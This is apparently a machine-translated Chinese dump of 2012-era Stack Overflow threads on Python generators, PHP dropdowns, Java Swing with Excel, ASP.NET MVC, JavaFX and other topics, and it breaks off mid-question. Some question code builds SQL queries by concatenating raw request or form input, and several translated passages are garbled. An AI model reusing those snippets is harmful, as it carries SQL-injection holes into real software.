1.  在您的示例中，盐是`YiP34XiXdXyh9fZn`（`base-64 encoded`）。

2.  是的，在这种情况下，盐只能防止彩虹表。

3.  `SHA512`现在还是安全的。攻击者需要一个密码列表。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-02-27T21:50:58.483

这篇文章真的很旧，但我还是想纠正这个。
它不仅适用于彩虹表攻击，还适用于针对整个数据库的常见攻击。
捕获 pw 数据库的攻击者不会那么愚蠢并单独攻击每个哈希。
他会一下子攻击他们。
所以他必须计算，例如，在对每个哈希进行一次字典攻击时，然后可以将其与数据库中的所有哈希进行比较。
使用随机盐，他必须单独计算每个 pw 的每个哈希值。
这几乎会减慢哈希数的一个因素。
盐渍大数据库比普通哈希数据库更难攻击。

# python - 什么是函数中的“yield”语句？

> ID：12068827
> 
> 赞同：18
> 
> 时间：2012-08-22T08:07:36.850
> 
> 标签：python

> **可能重复：**
> [Python yield 关键字解释](https://stackoverflow.com/questions/231767/the-python-yield-keyword-explained)

有人可以在这里向我解释一下 yield 语句在这段代码中的实际作用：

```
 def fibonacci():
     a, b = 0, 1
     while True:
         yield a
         a, b = b, a+b 
```

for number in `fibonacci()`: # 使用生成器作为迭代器；打印号码

到目前为止我的理解是，我们正在定义一个`finonacci()`没有参数的函数？在我们定义的函数内部`a`，`b`等于 0 和 1，接下来，虽然这是真的，但我们正在让`a`. 这实际上在做什么？此外，在产生`a`? `a`现在等于`b`，而`b`现在等于`a + b`。

下一个问题，对于 number in `fibonacci()`，这意味着函数中的每个数字还是什么？我同样对产量和“数量”实际上在做什么感到困惑。显然，我知道这意味着`fibonacci()`打印数字中的每个数字。我实际上是在不知道数字的情况下定义数字吗？

谢谢，如果我不清楚，对不起。顺便说一句，它适用于 Euler 项目，如果我知道如何很好地编程，这将是一件轻而易举的事，但我正在努力学习这一点。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-22T08:11:25.190

Using`yield`使函数成为生成器。生成器将在每个循环中继续产生`a`变量，等待直到`next()`调用生成器的方法以继续进行下一次循环迭代。

或者，直到你`return`或被`StopIteration`提出。

稍作修改以显示使用`StopIteration`：

```
>>> def fib():
...     a = 0
...     b = 1
...     while True:
...         yield a
...         a = b
...         b += a
...         if a > 100:
...             raise StopIteration
...
>>>
>>> for value in fib():
...     print value
...
0
1
2
4
8
16
32
64
>>>

>>> # assign the resulting object to 'generator'
>>> generator = fib()
>>> generator.next()
0
>>> generator.next()
1
>>> for value in generator:
...     print value
...
2
4
8
16
32
64
>>> 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-22T08:11:13.520

当代码调用时，`fibonacci`会创建一个特殊的生成器对象。请注意，没有代码被执行——只返回一个生成器对象。当您稍后调用其`next`方法时，该函数将一直执行，直到遇到`yield`语句。返回提供给的对象`yield`。当您再次调用`next`方法时，函数会再次执行，直到遇到`yield`. 当没有更多`yield`语句并且到达函数末尾时，将`StopIteration`引发异常。

请注意，函数内部的对象在调用`next`. 这意味着，当代码在下一个循环中继续执行时，`yield`被调用的范围内的所有对象的值都来自上一次`next`调用返回的点。

生成器最酷的地方在于它们允许使用`for`循环进行方便的迭代。for 循环从调用结果中获取生成器`fibonacci`，然后使用`next`生成器对象的方法执行循环检索元素，直到`StopIteration`遇到异常。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-08-22T08:20:33.817

生成器具有可迭代的特殊属性，它不会为它们的值消耗内存。

他们通过计算新值来做到这一点，在迭代时需要它。

IE

```
def f():
    a = 2
    yield a
    a += 1

for ele in f():
    print ele 
```

会打印

```
 2 
```

因此，您将函数用作不断返回值的可迭代对象。当您需要大量内存使用时，这尤其有用，因此您无法负担使用列表推导式

IE

```
li = [ele*10 for ele in range(10)] 
```

将 10 个内存空间用于 int 作为列表

但如果你只是想迭代它，不要单独访问它

改为使用会非常节省内存

```
def f():
    i=0
    while i<10
        yield i*10
        i += 1 
```

这将使用 1 个内存空间，因为我不断被重用

一个捷径是

```
ge = (i*10 for i in range(10)) 
```

您可以执行以下任何操作

```
for ele in f():

for ele in li:

for ele in ge: 
```

获得等效结果

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-22T08:17:38.910

这个[答案](https://stackoverflow.com/a/231855/1614219)是对`yield`语句以及迭代器和生成器的一个很好的解释。

具体在这里，第一次调用`fibonaci()`会初始化`a`为0，初始化`b`为1，进入while循环并返回`a`。任何下一次调用都将在`yield`语句之后开始，影响`b`to `a`，`a+b`to `b`，然后转到语句的下一次迭代`while`，再次到达该`yield`语句，然后`a`再次返回。

# php - 在下拉列表中的页面加载上已经选择了一个选项，并且还可以更改

> ID：12068830
> 
> 赞同：0
> 
> 时间：2012-08-22T08:07:49.447
> 
> 标签：php, javascript, jquery, mysql

> **可能重复：**
> [PHP - 预选下拉选项](https://stackoverflow.com/questions/3030604/php-pre-select-drop-down-option)

我的 php 项目中有一种情况，用户可以编辑他的帐户。

在编辑中，有一个城市字段，它是城市的下拉列表。

我想在编辑之前选择一个在个人资料中的城市（用户在注册时输入的城市）。

此外，他还可以通过选择 fron 下拉列表来更改他的城市。

html代码：

```
<div class="search_bar1_txt">State:</div>
<div class="search_bar1">
<select class="styled" name="state_trainer">
 <option>-select-</option>
 <option>washington</option>
 <option>perth</option>
 <option>delhi</option>
 <option>london</option>
 </select></div>
</div> 
```

在编辑时，我正在使用此代码来获取用户的当前数据（城市）：

```
<?php
if(isset($_GET['userid']))
{
$sql = "select city from `wp_pelleresuser` where userId =".$_GET['userid'];
$result = mysql_query($sql);
$value = mysql_fetch_assoc($result);
}?> 
```

请告诉我如何才能选择一个从数据库中获取的选项。

而且它是可变的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T09:34:37.333

```
<div class="search_bar1_txt">State:</div>
 <div class="search_bar1">
  <select class="styled" name="state_trainer">
   <option <?if($value['city']=='-select-') echo "selected";?>>-select-</option>
   <option <?if($value['city']=='washington') echo "selected";?>>washington</option>
   <option <?if($value['city']=='perth') echo "selected";?>>perth</option>
   <option <?if($value['city']=='delhi') echo "selected";?>>delhi</option>
   <option <?if($value['city']=='london') echo "selected";?>>london</option>
  </select>
 </div>
</div> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T08:12:28.290

我不确定这是否是明确的方式，但您可以将代码放在每个选项单元格中，如下所示：

```
<option <?php if($value['city'] == "washington") echo "selected=selected"; ?> >washington</option> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-22T08:14:47.373

您可以通过多种方式做到这一点，最简单的（可能也是最不优雅的）是这样做：

```
<select class="styled" name="state_trainer">
<?php
$myCity='london'; // assumed to be data from database...
echo '<option'.($myCity=='-select-') ? ' selected ' : ' ' .'-select-</option>';
echo '<option'.($myCity=='washington') ? ' selected ' : ' ' .'washington</option>';
?> 
```

这当然是可怕的。

我宁愿建议您在从数据库中提取信息并将初始下拉列表放在一起时检查数据。

如果您正在制作一组数据来创建下拉列表（例如），请立即检查它。如果城市符合您的要求，请立即在您的循环中进行。

```
$usersCity="london";
$myCityList=array();

while( ... ) // Database loop that is pulling the data from the database.
{
    $selected='';
    if($userCity==$row['city'])
    {
        $selected=' selected ';
    }
    $myCityList[]='<option'.$selected.'>'.$row['city'].'</option>';
} 
```

然后要显示下拉列表，您可以简单地执行以下操作：

```
$cityCount=count($myCityList);
for($i=0;$i<$cityCount;$i++)
{
    echo $myCityList[$i].'\n';
} 
```

用户城市将已被选中。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-22T08:26:03.447

这样你就可以得到你想要的。并更好地使用 mysqli 函数进行数据库交互。

```
<option
<?php if ($value['city'] == delhi)
          {
                                echo "selected = true"; 

          }  ?> 
 >delhi
</option> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-22T10:50:19.117

只需将选定的值形式 db 像

```
$choosen = $some value form db 
```

然后 $options = array(1 => 'data1', 2 => 'data2', 3 => 'data3'); foreach ($options as $key => $value) { echo '' . $价值。''; }

让你的选择框在 php.I thnk 你明白，它适用于我

# java - 在 Android 中的 Adob e air 和 java 之间共享 sqlite 数据库？

> ID：12068832
> 
> 赞同：0
> 
> 时间：2012-08-22T08:07:52.653
> 
> 标签：java, android, database, air, share

我有一个在 sd 卡上创建 sql db 的 air 应用程序，我正在尝试从我的其他 java 程序访问该 db ......但 java 说它无法访问只读 db 文件！

java和air之间不能共享一个.db吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T11:30:03.123

好的，问题是我必须像这样连接到数据库：

```
File dbfile = new File("/sdcard/someFolderName/app.db" ); 
SQLiteDatabase db2 = SQLiteDatabase.openOrCreateDatabase(dbfile, null); 
```

最好使用`Environment.getExternalStorageDirectory()`而不是`/sdcard` 也不要忘记通过此行访问应用程序

```
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /> 
```

还有一件事：我使用的文件具有读写权限。也许这会导致错误，这很好，现在我可以使用相同`.db`的 from`air`和`java`应用程序 :)

# java - 如何将组合框值插入到 Excel 工作表中

> ID：12068849
> 
> 赞同：3
> 
> 时间：2012-08-22T08:09:08.433
> 
> 标签：java, swing

我正在使用 java swing 构建一个独立的应用程序，并且我使用 excel 2007 工作表作为存储数据的后端。我已成功地将 GUI 中的文本值和整数值插入到 Excel 工作表中。现在我无法将选定的值插入到`JCombobox`Excel 工作表上。谁能告诉我该怎么做？

```
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;
import java.sql.*;
import java.io.*;

public class ExcelTest extends Frame implements ActionListener

{
 Label l1;
 TextField textID, textFirstName, textLastName, textJobTitle;
 Button First, Next, Previous, Last;
 JComboBox comboGrade;

 public ExcelTest(String s) {

  setTitle("Testing connection");
  setLayout(null);
  l1 = new Label("Job Title");
  textJobTitle = new TextField(20);
  l1.setBounds(50, 100, 200, 50);
  textJobTitle.setBounds(300, 110, 135, 30);

  textID = new TextField(10);
  textID.setBounds(300, 160, 135, 30);

  textFirstName = new TextField(20);
  textFirstName.setBounds(300, 210, 135, 30);

  textLastName = new TextField(20);
  textLastName.setBounds(300, 260, 135, 30);

  final String[] grade = {
   "X",
   "Y",
   "Z"
  };
  comboGrade = new JComboBox(grade);
  comboGrade.setEditable(true);
  comboGrade.addActionListener(new ActionListener() {

   public void actionPerformed(ActionEvent e) {
    if (e.getActionCommand().equals("comboBoxEdited")) {
     System.out.println("Adding new player!");
     comboGrade.insertItemAt(comboGrade.getSelectedItem(), 0);
    }
   }
  });

  comboGrade.setBounds(300, 300, 135, 30);

  First = new Button("First");
  First.setBounds(200, 600, 80, 40);

  Previous = new Button("PREVIOUS");
  Previous.setBounds(400, 600, 80, 40);

  Next = new Button("NEXT");
  Next.setBounds(600, 600, 80, 40);

  Last = new Button("LAST");
  Last.setBounds(800, 600, 80, 40);

  add(l1);
  add(textJobTitle);

  add(textFirstName);
  add(textLastName);
  add(textID);
  add(comboGrade);

  add(First);
  First.addActionListener(this);
  add(Next);
  Next.addActionListener(this);
  add(Previous);
  Previous.addActionListener(this);
  add(Last);
  Last.addActionListener(this);

  setSize(1000, 1000);
  setVisible(true);
  setResizable(false);

 }

 public void actionPerformed(ActionEvent ae) {

  try {
   //String id="";
   //String first_name="";
   //String last_name="";
   //String job="";

   String value1 = textID.getText();

   String value2 = textFirstName.getText();

   String value3 = textLastName.getText();

   String value4 = textJobTitle.getText();

   String value5 = comboGrade.getText();

   //connect to the database  
   Class.forName("sun.jdbc.odbc.JdbcOdbcDriver").newInstance();
   Connection con = DriverManager.getConnection("jdbc:odbc:Testing");

   //Execute some sql and load the records into the resultset

   Statement stmt = con.createStatement();
   String q = "insert into [sheet1$](id,first_name,last_name,job_Title,grade) values     ('" + value1 + "','" + value2 + "','" + value3 + "','" + value4 + "','" + value5 + "')";
   int ds = stmt.executeUpdate(q);
   System.out.println("Data is inserted");

   //move the cursor to the first record and get the data

   stmt.close();
   con.close();

  } catch (java.lang.ClassNotFoundException e) {
   System.err.print("ClassNotFoundException: ");
   System.err.println(e.getMessage());
  } catch (SQLException err) {
   JOptionPane.showMessageDialog(ExcelTest.this, err.getMessage());
  }

  //catch(java.lang.InstantiationException i){}
  catch (Exception e) {}
 }

 public static void main(String s[]) throws NullPointerException {

  ExcelTest myFrame = new ExcelTest("MANAGEMENT OF STATEMENT OF WORKS");

  myFrame.addWindowListener(new WindowAdapter() {
   public void windowClosing(WindowEvent we) {
    System.exit(0);
   }
  });
 }

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:15:13.547

这一行：

```
String value5=comboGrade.getText(); 
```

应该是这样的：

```
String value5 = (String) comboGrade.getSelectedItem(); 
```

# filter - 使用 Drupal 7 Views 正确搜索 Ubercard

> ID：12068858
> 
> 赞同：1
> 
> 时间：2012-08-22T08:09:26.813
> 
> 标签：filter, drupal-7, drupal-views

**概述** 我想在 Drupal 7 中创建一个产品搜索。我创建了一个视图并公开了我希望为搜索（过滤）公开的字段。搜索工作完美，但仅当您使用项目标题搜索项目时。

**问题：** 我希望用户能够使用所有过滤器输入更“描述性搜索”：

1.  标题
2.  类型
3.  变体
4.  尺寸
5.  SKU等

**查看 SQL 代码示例**

```
 SELECT node.nid AS nid, node.type AS node_type, node.language AS node_language, node.title AS node_title, uc_products.model AS uc_products_model, node.created AS node_created, 'node' AS field_data_uc_product_image_node_entity_type, 'node' AS field_data_field_product_variant_node_entity_type, 'node' AS field_data_body_node_entity_type, 'node' AS field_data_field_product_tags_node_entity_type
FROM 
{node} node
LEFT JOIN {field_data_body} field_data_body ON node.nid = field_data_body.entity_id AND (field_data_body.entity_type = 'node' AND field_data_body.deleted = '0')
LEFT JOIN {field_data_field_product_variant} field_data_field_product_variant ON node.nid = field_data_field_product_variant.entity_id AND (field_data_field_product_variant.entity_type = 'node' AND field_data_field_product_variant.deleted = '0')
LEFT JOIN {uc_products} uc_products ON node.vid = uc_products.vid
WHERE (( (node.status = '1') AND (node.type IN  ('product')) AND (field_data_body.body_value LIKE '%%' ESCAPE '\\') AND (field_data_field_product_variant.field_product_variant_value LIKE '%%' ESCAPE '\\') ))
ORDER BY node_created DESC, node_title ASC
LIMIT 6 OFFSET 0 
```

我想找出我做错了什么。我希望将所有公开的过滤器实体合并为一个，以便可以从一个搜索框中搜索/过滤它们。

非常感谢您的回复。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-23T15:30:44.750

你可以看看这个模块[http://drupal.org/project/views_filters_populate](http://drupal.org/project/views_filters_populate)

但它仅适用于文本过滤器（无组合等）。

# jquery - 无法在 SharePoint 2010 中为 NT AUTHORITY\authenticated 访问者使用 JQuery“查看所有网站内容”隐藏

> ID：12068859
> 
> 赞同：0
> 
> 时间：2012-08-22T08:09:30.400
> 
> 标签：jquery, sharepoint-2010

我的选择是使用 JQuery 隐藏“查看所有网站内容”链接。

我使用此代码时的结果是该链接将对*管理员*隐藏，但不会对具有 NT AUTHORITY\authenticated 权限的访问者隐藏。如何也为 NT AUTHORITY\authenticated 用户隐藏“查看所有站点内容”？

`$('#ctl00_PlaceHolderLeftNavBar_PlaceHolderQuickLaunchBottom_PlaceHolderQuickLaunchBottomV4_idNavLinkViewAllV4').hide();`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2020-02-26T12:34:43.253

**共享点 2013**

有两种不需要代码的可能性：

*   将访客组的权限级别从读取更改为
*   Restricted Read Alternate 访问者组的读取权限级别，并从读取权限级别中删除基本权限查看应用程序页面。

**SharePoint Online**

我提出的解决方案需要使用控件 SPSecurityTrimmerControl。这是包含在程序集 Microsoft.SharePoint.WebControls 中的控件，它对其中的子控件进行安全修整。它基本上会对不符合给定安全定义的用户隐藏其所有内容。

在编辑模式下打开母版页并编辑与站点内容相关的 MenuItemTemplate，方法是将其移动到 SPSecurityTrimmerControl 控件中。

```
<SharePoint:SPSecurityTrimmedControl 
  runat="server" 
  Permissions="AddListItems" 
  PermissionContext="CurrentItem" 
  PermissionMode="Any"><SharePoint:MenuItemTemplate runat="server" 
    id="MenuItem_ViewAllSiteContents"Text="<%$Resources:wss,quiklnch_allcontent_15%>"Description="<%$Resources:wss,siteactions_allcontentdescription%>"ImageUrl="/_layouts/15/images/allcontent32.png?rev=43"MenuGroupId="200"Sequence="240"UseShortId="true"ClientOnClickNavigateUrl="~siteLayouts/viewlsts.aspx"PermissionsString="ViewFormPages"PermissionMode="Any" />
</SharePoint:SPSecurityTrimmedControl> 
```

PS。此解决方案不会通过 URL 限制访问。

# android - 哪个网络库遵循 android 准则？

> ID：12068876
> 
> 赞同：0
> 
> 时间：2012-08-22T08:10:30.617
> 
> 标签：android

我看过 Google I/O 2012 关于优化网络性能的演讲，还在这里阅读了一篇文章：http: [//developer.android.com/training/efficient-downloads/efficient-network-access.html](http://developer.android.com/training/efficient-downloads/efficient-network-access.html)。

是否有一些遵循这些准则的网络库？它可能应该支持一些预取/缓存以及上面文章中描述的所有内容。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T08:19:30.223

看看[RakNet](http://www.raknet.com/index.html)。

它是一个跨平台的网络库。定价 android 也被列出，所以我想它是受支持的。这个库设计得很好，因为有 ios 和 android 的定价模型，我很确定它遵循你提到的准则

# javascript - Ember.js / Handlebars：使用 {{view}} 助手渲染的视图不绑定属性

> ID：12068880
> 
> 赞同：0
> 
> 时间：2012-08-22T08:10:44.533
> 
> 标签：javascript, ember.js, handlebars.js

我对 Ember/Handlebars 视图有一个神秘的问题。我正在尝试在 Handlebars 视图中实现非常简单的数据绑定。通过执行以下操作呈现我的视图时，这可以正常工作：

```
Ember.Views.NavView.create().append() 
```

但是当我尝试使用 {{view}} 帮助器渲染同一视图的另一个实例时，未显示绑定属性，如下所示：

```
<script type="text/x-handlebars">
    {{view App.Views.NavView}}
</script> 
```

在第一种情况下，属性（在此测试用例的视图上硬编码）正确显示。在第二种情况下，我得到“metamorph-0-start”和“metamorph-0-end”标签，但值本身没有呈现。

我已经建立了一个 JSFiddle ( [http://jsfiddle.net/XUyht/2/](http://jsfiddle.net/XUyht/2/) ) 清楚地说明了这个问题。

您会看到我已经渲染了两次视图：第一次使用 {{view}} 帮助程序，第二次使用 append() - 但属性“工作”仅在后一种情况下显示。

这里发生了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T09:11:15.290

我不知道你为什么需要这种模板的实现，但无论如何，从 1.0-pre 开始，视图的默认上下文要么是它的控制器，要么是它的父视图。所以在你的情况下，如果你用 替换`tmp.foo`，`view.tmp.foo`这是有效的。

见[http://jsfiddle.net/Sly7/amLfk/](http://jsfiddle.net/Sly7/amLfk/)

# javascript - 使用 javascript 完成清单缓存时发出警报

> ID：12068892
> 
> 赞同：4
> 
> 时间：2012-08-22T08:11:13.657
> 
> 标签：javascript, html, caching, cache-manifest

当 cache.manifest 已下载 html5 应用程序中的所有文件时，如何提醒成功消息？（基本上完成缓存下载的成功警报）！

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-24T08:49:27.820

[非常感谢来自 Garden Gnome http://gardengnomesoftware.com/wiki/Cache_Manifest_File](http://gardengnomesoftware.com/wiki/Cache_Manifest_File)的深思熟虑的文章

我找到了答案。您所要做的就是创建一个 div，它将通过将其添加到您的页面来显示缓存的状态：

```
<div id="cachestatus" style="position:fixed;left: 2px;top: 2px; width: 150px;height:18px;color: #ff0000;padding: 1px 3px; opacity:1; z-index:100; font-family:Arial, Helvetica, sans-serif; opacity:0.2;"></div> 
```

并在此 div 之后添加以下 java 脚本：

```
<script type="text/javascript">

    var cacheStatus  = document.getElementById('cachestatus');
    cacheStatus.innerHTML="cache status";

    if (navigator.onLine) {
        window.applicationCache.addEventListener('updateready', function(e) {
            if (window.applicationCache.status == window.applicationCache.UPDATEREADY) {
                window.applicationCache.swapCache();
                cacheStatus.innerHTML="update ready!";
                if (confirm('A new version of this page is available. Reload?')) {
                    window.location.reload();
                }
            }
        }, false);
        window.applicationCache.addEventListener('cached', function(e) {cacheStatus.innerHTML="cache is ready!"; },false);
        window.applicationCache.addEventListener('noupdate', function(e) { cacheStatus.innerHTML="cache is up to date!"; },false);
        window.applicationCache.addEventListener('downloading', function(e) { cacheStatus.innerHTML="downloading..."; },false);
        window.applicationCache.addEventListener('error', function(e) { cacheStatus.innerHTML="error"; },false);
        window.applicationCache.update();
    } else {
        cacheStatus.innerHTML="offline";
    }
</script> 
```

缓存的状态将显示在 DIV 中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T09:21:57.173

您可以绑定到`window.applicationCache`对象中的各种事件。其中之一是`updateready`事件。

您还必须确保为用户正确重新加载任何缓存更新。[请参阅](http://www.html5rocks.com/en/tutorials/appcache/beginner/)以下涵盖应用程序缓存基础知识、其事件以及如何以编程方式处理更新的文章。

在处理 AppCache 时您应该参考的其他一些文章是：

*   [http://appcachefacts.info/](http://appcachefacts.info/)
*   [http://www.alistapart.com/articles/application-cache-is-a-douchebag/](http://www.alistapart.com/articles/application-cache-is-a-douchebag/)

# java - 评估 JSPX 文档中 HTML 属性的 EL 表达式

> ID：12068893
> 
> 赞同：0
> 
> 时间：2012-08-22T08:11:17.013
> 
> 标签：java, jsp, jspx

我在 Spring 应用程序中使用 JSPX 文档，我发现了一件奇怪的事情：EL 表达式不在 HTML 属性中评估，仅在 taglib 属性中。让我举个例子。给定以下代码段：

```
<c:forEach items="${articles}" var="article">
  <a href="/articles/${article.id}">${article.title}</a>
</c:forEach> 
```

如果我有 id 为 2 且标题为“StackOverflow 示例”的文章，那么我会得到以下输出：

```
<a href="/articles/${article.id}">StackOverflow example</a> 
```

因此，href 属性中的表达式不会被评估。正常吗？我用`<jsp:element>`魔法解决了它，但如果 EL 评估也可以在 HTML 属性中工作，它会更有用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T09:02:05.553

确保您的 web.xml 在顶部有正确的声明，例如：

```
<web-app
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xmlns="http://java.sun.com/xml/ns/javaee"
   xmlns:web="http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"
   xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"
version="2.5">
...
</web-app> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T10:21:23.093

尝试使用**c:url**而不是 html 锚链接。请参阅此[链接](http://www.datadisk.co.uk/html_docs/jsp/jsp_using_jstl.htm)以了解 c:url。

# c# - 从 TextBox 更改为 DropDownList

> ID：12068894
> 
> 赞同：1
> 
> 时间：2012-08-22T08:11:17.590
> 
> 标签：c#, asp.net-mvc-3, razor

我的应用程序有一个自定义会员资格，它与通用会员资格几乎相同。在其他细节中，不同之处在于我如何将值传递给我`Register`的 post 方法。

到目前为止，我的方法参数中有用户名、密码、名字、...、状态，所有这些都是字符串（还有更多但与问题无关），如下所示：

```
public ActionResult Register(string userName, string password, string confirmPassword, string firstName, string lastName, string address, string city, string state, string zip) 
```

手头的问题是`State`参数，现在我希望它从下拉列表中传递，而不是像目前那样从文本框传递。

我已经制作了一个模型来填充下拉列表。

```
public class State
{
    public int StateID { get; set; }
    public string StateName { get; set; }
} 
```

`SelectList`并在我的`Register View`方法中添加适当的。

```
public ActionResult Register()
{
    ViewBag.StateID = new SelectList(db.States, "StateID", "StateName");
    ViewData["PasswordLength"] = MembershipService.MinPasswordLength;

    return View();
} 
```

然后我改变了`Register` `View`, 并制作了一个下拉菜单而不是`Html.TextBoxFor`助手。

```
@Html.DropDownList("StateID", (SelectList)ViewBag.StateID, new { @class = "ddl" }) 
```

请注意，除`username`和之外的所有这些参数`password`都保存在`User Profile`属性中。这就是在`Register`post 方法中完成的方式。

```
ProfileBase _userProfile = ProfileBase.Create(userName);

_userProfile.SetPropertyValue("FirstName", firstName);
_userProfile.SetPropertyValue("LastName", lastName);
_userProfile.SetPropertyValue("Address", address);
_userProfile.SetPropertyValue("City", city);
_userProfile.SetPropertyValue("State", state);
_userProfile.SetPropertyValue("Zip", zip);

_userProfile.Save(); 
```

最后，问题是它没有被保存。该`State`用户的属性为`Profile`空。

我已经尝试了更多的想法，但到目前为止还没有。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T08:33:33.337

下拉列表应与您希望它映射到的参数具有相同的名称。看起来它的 id 是**"StateID"**，但它应该是**"state"**（作为参数的名称）。

所以它应该是：

```
@Html.DropDownList("State", (SelectList)ViewBag.StateID, new { @class = "ddl" }) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T08:27:52.777

问题是您在下拉列表中使用了与您尝试在操作中映射它的参数不同的名称。

如果您使两者匹配，那么这应该有助于解决您的问题。

所以你应该把它改成：

```
 @Html.DropDownList("State", (SelectList)ViewBag.StateID, new { @class = "ddl" }) 
```

希望这可以帮助。

# nservicebus - 零停机 NServiceBus 升级

> ID：12068901
> 
> 赞同：2
> 
> 时间：2012-08-22T08:11:43.877
> 
> 标签：nservicebus

Udi 和 Andreas 多次提到 NServiceBus 安装的零停机升级。对 NServiceBus 安装执行零停机升级的正确方法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T16:02:45.607

这意味着，由于 NSB 使用消息传递作为底层传输，您可以关闭端点并且仍将接收数据。假设升级没有破坏消息契约，那么您可以重新启动端点并且不会有停机时间，只是升级时的处理延迟。

消息合约可以以向后兼容的方式进行版本控制，您需要确保使用消息接口并遵循消息合约[版本控制指南。](http://docs.particular.net/samples/versioning/)

（由乌迪添加）

还有 NServiceBus.Host.exe 的并行部署，它允许您运行同一个进程的两个版本，同时从同一个队列中馈送。在此模型中，您可以消除处理延迟，这在您有严格服务级别协议的环境中非常重要。

# javascript - 能够得到一个随机生成的目录名

> ID：12068904
> 
> 赞同：0
> 
> 时间：2012-08-22T08:11:48.887
> 
> 标签：javascript

我使用这个 javascript 函数来处理 XML 文档：

```
$.get('./cliLog.xml', function(xml) {
 //some code
}); 
```

问题是实际上“cliLog.xml”位于一个目录中，其名称如下：

“cliLogging-_value_generate_”。

我希望能够通过仅使用目录名称的部分名称“cliLogging-”来获取 cliLog.xml。

就像是 ：

```
$.get('../cliLogging-*/cliLog.xml', function(xml) {
  //some code
}); 
```

但是“cliLogging-*”不起作用:( ...

谁能帮我 ？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T08:14:33.380

您必须为此编写服务器端 API，这可能会存在安全问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T08:19:35.057

价值是如何产生的？如果它是在服务器端生成的，您可以在所需的位置打印它，否则如果它是通过 javascript 生成的，即使打印它可能不是最佳选择，因为它为很多安全问题留下了空间。

Javascript版本：

```
$.get('../cliLogging-'+variable+'/cliLog.xml', function(xml) {
  //some code
}); 
```

PHP版本

```
$.get('../cliLogging-'<?=$variable;?>'/cliLog.xml', function(xml) {
  //some code
}); 
```

替代。

```
//if the string is assigned to a variable
$string ="$.get('../cliLogging-".$variable."/cliLog.xml', function(xml) {
  //some code
}); 
```

# java - JavaFX TableView 性能问题

> ID：12068907
> 
> 赞同：8
> 
> 时间：2012-08-22T08:12:05.720
> 
> 标签：java, performance, javafx, javafx-2, tableview

我正在使用 javafx 表视图控件来显示我的表数据。现在数据非常庞大，当我在控件中显示完整数据时它崩溃了。有什么方法可以这样做，或者我必须缓存数据以便我可以分块显示它。我应该改用 JTable 吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-26T00:18:31.260

我使用 CellFactory 类对 tableview 进行了延迟加载...我将尝试解释，任何英语比我更好的人都可以自由编辑并使其更易于理解！

首先，我在 Bean 中使用强制属性来检查该 bean 是否已经加载。这样我就不需要专门为此创建一个属性。

其次，我将我的 Bean 集合加载到 TableView 中，只是加载了 'id' 属性，这使我的表格全部显示为空白。

最后，我创建了一个 CellFactory，如下所示，检查对象是否已加载，如果没有，请立即执行。

```
namecolumn.setCellFactory(new Callback<TableColumn<PersonBean, String>, TableCell<PersonBean, String>>() {
@Override
  public TableCell<PersonBean, String> call(TableColumn<PersonBean, String> param) {
    TableCell<PersonBean, String> newtablecell = new TableCell<PersonBean, String>() {
      @Override
      protected void updateItem(String item, boolean empty) {
        // Since I got some strange errors when method getIndex() return greatter value than my collection size, I need to validate before getting the object
        if (getIndex() < getItems().size()) {
          //Retrieve the collection object
          PersonBean personbean = getItems().get(getIndex());
          // Name is mandatory, so if it is null my bean was not loaded yet
          if (personbean.getName() == null) {
            // Call other centralized method to make load, details explained later
            loadPersonBean(personbean);
          }
          // Now I put the value on TableCell. Remember "item" still empty so we need to use Bean
          setText(personbean.getName());
          setAlignment(Pos.CENTER);
        }
      }
    };
    return newtablecell;
  }
}); 
```

在 loadPersonBean 方法中，我传递 TableView Collection 中包含的对象并从数据库中加载它。比我将所有需要的数据复制到从表中接收到的 bean 中。我没有尝试在 TableView 中交换对象，但我相信它可能会导致并发异常。

其他观察：在我所有的测试中，TableView 总是尊重列顺序来调用我的 CellFactory，但我没有测试如果用户交换列顺序，它是否仍然尊重顺序。所以我更喜欢将带有“LazyLoadCheck”部分代码的 CellFactory 添加到所有列。

希望我让自己足够清楚以提供帮助！如果还有任何问题，请发表评论，我会尽力做出更好的解释。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-23T14:14:53.323

我不太确定我是否正确理解了您的问题，但是延迟加载项目呢？[实际上Docs 中直接](http://docs.oracle.com/javafx/2/api/javafx/scene/control/TreeItem.html)有一个示例。虽然它适用于 TreeView 而不是 TableView，但您应该能够简单地适应背后的想法。

希望对我的TreeView有所帮助，到目前为止它解决了很多问题。

干杯，雷吉娜

# java - Socket.bind 的首选网络接口

> ID：12068908
> 
> 赞同：1
> 
